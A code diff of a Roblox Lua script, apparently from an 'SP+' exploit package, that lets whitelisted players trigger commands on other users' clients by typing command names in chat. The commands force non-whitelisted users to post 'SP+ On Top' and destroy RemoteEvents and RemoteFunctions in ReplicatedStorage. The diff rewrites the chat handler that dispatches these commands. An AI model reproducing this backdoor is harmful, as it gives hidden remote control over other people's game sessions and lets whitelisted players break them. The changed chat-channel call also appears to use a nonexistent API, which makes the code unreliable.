@@ -61,7 +61,7 @@ local commands = {
     reveal = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local textChatService = game:GetService("TextChatService")
-            textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("SP+ On Top")
+            textChatService:GetChannel("SP+ On Top"):SendSystemMessage("SP+ On Top")
         end
     end,
     void = function()
@@ -154,7 +154,9 @@ local commands = {
             pcall(function()
                 local replicatedStorage = game:GetService("ReplicatedStorage")
                 for _, child in ipairs(replicatedStorage:GetDescendants()) do
-                    child:Destroy()
+                    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+                        child:Destroy()
+                    end
                 end
             end)
         end
@@ -201,23 +203,24 @@ local commands = {
         end
     end
 }
-		textChatService.OnIncomingMessage = function(message: TextChatMessage)
-	    local properties = Instance.new("TextChatMessageProperties")
-		    if message.TextSource then
-		        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-		        if isPlayerAllowed(player.Name) then
-		            properties.PrefixText = "<font color='#9A9AEB'>[SP+ PRIVATE]</font> " .. message.PrefixText
-		        end
-		    end
-		    if message.TextSource then
-		        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-		        if isPlayerAllowed(player.Name) then
-		            local command = commands[message.Text]
-		            if command then
-		                command()
-		            end
-		        end
-		    end
-		    return properties
-		end
-	end
+
+
+textChatService.OnIncomingMessage = function(message: TextChatMessage)
+    local properties = Instance.new("TextChatMessageProperties")
+    if message.TextSource then
+        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
+        if isPlayerAllowed(player.Name) then
+            properties.PrefixText = "<font color='#9A9AEB'>[SP+ PRIVATE]</font> " .. message.PrefixText
+        end
+    end
+    if message.TextSource then
+        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
+        if isPlayerAllowed(player.Name) then
+            local command = commands[message.Text]
+            if command then
+                command()
+            end
+        end
+    end
+    return properties
+end
